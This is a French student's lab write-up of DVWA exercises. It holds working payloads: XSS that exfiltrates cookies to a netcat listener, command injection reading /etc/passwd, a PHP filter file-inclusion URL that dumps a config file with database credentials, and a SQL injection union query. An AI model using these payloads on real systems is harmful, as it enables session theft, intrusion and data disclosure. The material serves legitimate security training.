## Sécurité TP 1

### Exercice 1

#### Consigne :

Se rendre dans la page « XSS reflected » et exploiter la faille de XSS afin d’afficher un message d’alerte

```html
<script>
    alert("hola");
</script>
```

### Exercice 2

#### Consigne :

Exploiter la faille XSS pour être redirigé vers la page google.fr

```html
<script>
    window.location.href = "http://google.fr";
</script>
```

### Exercice 3

Commande pour écouter sur le port 6666 :

```console
$ nc -l -p 6666
```

Script pour récupérer les cookies et les afficher :

```html
<script>
    const c = document.cookie;
    alert(c);
</script>
```

Redirection sur netcat :

```html
<script>
    document.location.href = `http://127.0.0.1:8080/`;
</script>
```

Script complet :

```html
<script>
    document.location.href = `http://127.0.0.1:8080/?c=${document.cookie}`;
</script>
```

### Exercice 4 :

#### Consigne :

Afficher les mots de passe présents dans le fichier /etc/passwd

```console
$ ping 127.0.0.1 && cat /etc/passwd
```

### Exercice 7 :

URL à mettre :

> http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/config/config.inc.php

Texte obtenu encodé en base64 :

```
PD9waHANCg0KIyBJZiB5b3UgYXJlIGhhdmluZyBwcm9ibGVtcyBjb25uZWN0aW5nIHRvIHRoZSBNeVNRTCBkYXRhYmFzZSBhbmQgYWxsIG9mIHRoZSB2YXJpYWJsZXMgYmVsb3cgYXJlIGNvcnJlY3QNCiMgdHJ5IGNoYW5naW5nIHRoZSAnZGJfc2VydmVyJyB2YXJpYWJsZSBmcm9tIGxvY2FsaG9zdCB0byAxMjcuMC4wLjEuIEZpeGVzIGEgcHJvYmxlbSBkdWUgdG8gc29ja2V0cy4NCiMgICBUaGFua3MgdG8gQGRpZ2luaW5qYSBmb3IgdGhlIGZpeC4NCg0KIyBEYXRhYmFzZSBtYW5hZ2VtZW50IHN5c3RlbSB0byB1c2UNCiREQk1TID0gJ015U1FMJzsNCiMkREJNUyA9ICdQR1NRTCc7IC8vIEN1cnJlbnRseSBkaXNhYmxlZA0KDQojIERhdGFiYXNlIHZhcmlhYmxlcw0KIyAgIFdBUk5JTkc6IFRoZSBkYXRhYmFzZSBzcGVjaWZpZWQgdW5kZXIgZGJfZGF0YWJhc2UgV0lMTCBCRSBFTlRJUkVMWSBERUxFVEVEIGR1cmluZyBzZXR1cC4NCiMgICBQbGVhc2UgdXNlIGEgZGF0YWJhc2UgZGVkaWNhdGVkIHRvIERWV0EuDQokX0RWV0EgPSBhcnJheSgpOw0KJF9EVldBWyAnZGJfc2VydmVyJyBdICAgPSAnMTI3LjAuMC4xJzsNCiRfRFZXQVsgJ2RiX2RhdGFiYXNlJyBdID0gJ2R2d2EnOw0KJF9EVldBWyAnZGJfdXNlcicgXSAgICAgPSAncm9vdCc7DQokX0RWV0FbICdkYl9wYXNzd29yZCcgXSA9ICd0cG91YWliZSc7DQoNCiMgT25seSB1c2VkIHdpdGggUG9zdGdyZVNRTC9QR1NRTCBkYXRhYmFzZSBzZWxlY3Rpb24uDQokX0RWV0FbICdkYl9wb3J0ICddID0gJzU0MzInOw0KDQojIFJlQ0FQVENIQSBzZXR0aW5ncw0KIyAgIFVzZWQgZm9yIHRoZSAnSW5zZWN1cmUgQ0FQVENIQScgbW9kdWxlDQojICAgWW91J2xsIG5lZWQgdG8gZ2VuZXJhdGUgeW91ciBvd24ga2V5cyBhdDogaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYWRtaW4vY3JlYXRlDQojIFRoYW5rcyB0byBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzM0Mjc0NDkyL2R2d2Etc2V0dXAtcGhwLWZ1bmN0aW9uLWFsbG93LXVybC1pbmNsdWRlLWRpc2FibGVkDQokX0RWV0FbICdyZWNhcHRjaGFfcHVibGljX2tleScgXSAgPSAnNkxkSzd4SVRBQXp6QUFKUVRmTDdmdTZJLTBhUGw4S0hIaWVBVF95SmcnOw0KJF9EVldBWyAncmVjYXB0Y2hhX3ByaXZhdGVfa2V5JyBdID0gJzZMZEs3eElUQXp6QUFMX3V3OVlYVlVPUG9JSFBaTGZ3MksxbjVOVlEnOw0KDQojIERlZmF1bHQgc2VjdXJpdHkgbGV2ZWwNCiMgICBEZWZhdWx0IHZhbHVlIGZvciB0aGUgc2VjdWlydHkgbGV2ZWwgd2l0aCBlYWNoIHNlc3Npb24uDQojICAgVGhlIGRlZmF1bHQgaXMgJ2ltcG9zc2libGUnLiBZb3UgbWF5IHdpc2ggdG8gc2V0IHRoaXMgdG8gZWl0aGVyICdsb3cnLCAnbWVkaXVtJywgJ2hpZ2gnIG9yIGltcG9zc2libGUnLg0KJF9EVldBWyAnZGVmYXVsdF9zZWN1cml0eV9sZXZlbCcgXSA9ICdsb3cnOw0KDQojIERlZmF1bHQgUEhQSURTIHN0YXR1cw0KIyAgIFBIUElEUyBzdGF0dXMgd2l0aCBlYWNoIHNlc3Npb24uDQojICAgVGhlIGRlZmF1bHQgaXMgJ2Rpc2FibGVkJy4gWW91IGNhbiBzZXQgdGhpcyB0byBiZSBlaXRoZXIgJ2VuYWJsZWQnIG9yICdkaXNhYmxlZCcuDQokX0RWV0FbICdkZWZhdWx0X3BocGlkc19sZXZlbCcgXSA9ICdkaXNhYmxlZCc7DQoNCiMgVmVyYm9zZSBQSFBJRFMgbWVzc2FnZXMNCiMgICBFbmFibGluZyB0aGlzIHdpbGwgc2hvdyB3aHkgdGhlIFdBRiBibG9ja2VkIHRoZSByZXF1ZXN0IG9uIHRoZSBibG9ja2VkIHJlcXVlc3QuDQojICAgVGhlIGRlZmF1bHQgaXMgJ2Rpc2FibGVkJy4gWW91IGNhbiBzZXQgdGhpcyB0byBiZSBlaXRoZXIgJ3RydWUnIG9yICdmYWxzZScuDQokX0RWV0FbICdkZWZhdWx0X3BocGlkc192ZXJib3NlJyBdID0gJ2ZhbHNlJzsNCg0KPz4NCg==
```

Texte obtenu après décodage en base64 :

```php
<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
#   Thanks to @digininja for the fix.

# Database management system to use
$DBMS = 'MySQL';
#$DBMS = 'PGSQL'; // Currently disabled

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'tpouaibe';

# Only used with PostgreSQL/PGSQL database selection.
$_DVWA[ 'db_port '] = '5432';

# ReCAPTCHA settings
#   Used for the 'Insecure CAPTCHA' module
#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin/create
# Thanks to http://stackoverflow.com/questions/34274492/dvwa-setup-php-function-allow-url-include-disabled
$_DVWA[ 'recaptcha_public_key' ]  = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';
$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';

# Default security level
#   Default value for the secuirty level with each session.
#   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
$_DVWA[ 'default_security_level' ] = 'low';

# Default PHPIDS status
#   PHPIDS status with each session.
#   The default is 'disabled'. You can set this to be either 'enabled' or 'disabled'.
$_DVWA[ 'default_phpids_level' ] = 'disabled';

# Verbose PHPIDS messages
#   Enabling this will show why the WAF blocked the request on the blocked request.
#   The default is 'disabled'. You can set this to be either 'true' or 'false'.
$_DVWA[ 'default_phpids_verbose' ] = 'false';

?>
```

### Exercice 8 :

Le caractère `'` provoque des erreurs car il est utilisé comme un caractère de fin de chaîne.

### Exercice 9 :

#### Consigne : Connaitre le nombre de colonne de la table actuelle

```sql
0' union select 1,GROUP_CONCAT(table_name) FROM information_schema.columns #

```

### Exercice 10 :

#### Consigne : Trouver le nom des bases de données et tables existantes

